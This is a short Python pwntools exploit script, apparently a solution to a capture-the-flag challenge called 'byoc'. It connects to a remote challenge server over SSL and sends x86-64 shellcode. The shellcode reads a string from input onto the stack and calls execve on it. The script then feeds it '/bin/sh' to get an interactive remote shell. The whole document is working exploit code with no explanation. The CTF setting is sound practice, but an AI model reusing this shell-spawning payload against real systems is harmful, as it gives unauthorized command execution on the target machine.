from pwn import *
context.arch = "amd64"
context.terminal = ["alacritty", "-e", "fish", "-c"]
# context.log_level = "critical"

gdbscript = """
    continue
"""
# r = gdb.debug(["./byoc"], gdbscript=gdbscript) 
r = remote("byoc-16704b9ea65c.chall.nnsc.tf", 1337, ssl=True)

payload = asm("""    
    mov rax, 0x00
    mov rdi, 0x00                
    mov rsi, rsp
    mov rdx, 0x08
    syscall

    mov rax, 0x3b
    mov rdi, rsp
    mov rsi, 0x00
    mov rdx, 0x00
    syscall
""")

r.sendafter(b"> ", payload)
r.clean(timeout=1)
r.send(b"/bin/sh\x00")
r.interactive()
